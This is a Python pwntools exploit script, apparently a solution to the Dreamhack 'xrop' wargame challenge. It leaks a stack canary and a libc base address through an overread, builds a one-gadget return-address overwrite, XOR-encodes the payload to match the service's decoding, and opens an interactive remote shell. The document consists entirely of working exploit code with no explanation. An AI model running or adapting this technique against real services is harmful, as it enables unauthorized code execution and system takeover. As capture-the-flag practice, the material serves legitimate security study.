from pwn import *
import string

port = 17568
rem = remote("host8.dreamhack.games", port)

lib = ELF("./Pwnable/xrop/problem/deploy/libc.so.6")

def send_payload(size):
  payload = b""
  letters = string.ascii_letters
  for i in range(size):
    payload += letters[i % len(letters)].encode()
  rem.sendafter(b"Input: ", payload)
  rem.recvuntil(b"You entered: ")
  rem.recvn(len(payload))

send_payload(0x19)
canary = u64(b"\x00" + rem.recvn(7))

send_payload(0x28)
lib_base = u64(rem.recvn(6) + b"\x00" * 2) - 128 + 0xb0 - lib.symbols['__libc_start_main']
gadget_addr = lib_base + 0xebdb3

payload = b"exit"
payload += b"\x00" * (0x18 - len(payload))
payload += p64(canary)
payload += p64(lib_base + 0x219500)
payload += p64(gadget_addr)
sending = bytes([payload[len(payload) - 1]])
for i in range(len(payload) - 2, -1, -1):
  sending = bytes([payload[i] ^ sending[0]]) + sending
rem.sendafter(b"Input: ", sending)
print(rem.recvline())
rem.interactive()